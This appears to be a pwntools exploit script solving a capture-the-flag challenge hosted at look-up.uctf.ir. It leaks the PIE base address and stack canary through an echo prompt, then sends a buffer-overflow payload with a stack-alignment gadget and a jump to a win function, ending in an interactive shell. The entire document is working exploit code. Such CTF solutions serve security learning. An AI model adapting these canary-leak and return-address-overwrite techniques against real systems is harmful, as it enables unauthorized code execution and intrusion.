from pwn import *

r = remote("look-up.uctf.ir", 5000)

sla = r.sendlineafter
sa = r.sendafter

# leak pie
sa(b"--- I'll repeat what you say :D ---\n", b"UCTF".rjust(0x1A, b"A"))
r.recvuntil(b"UCTF")
pie = u64(r.recvn(6).ljust(8, b"\x00")) - 0x137B
log.info(f"pie base: {hex(pie)}")
ret = pie + 0x101A
win = pie + 0x1270

# leak canary
sa(b"--- I'll repeat what you say :D ---\n", b"UCTF".rjust(0xB, b"A"))
r.recvuntil(b"UCTF")
canary = u64(r.recvn(7).rjust(8, b"\x00"))
log.info(f"canary: {hex(canary)}")

# get shell
payload = b"A" * 0xA
payload += p64(canary)
payload += b"A" * 0x8
payload += p64(ret)  # for stack alignment
payload += p64(win)
sa(b"--- I'll repeat what you say :D ---\n", payload)

r.interactive()
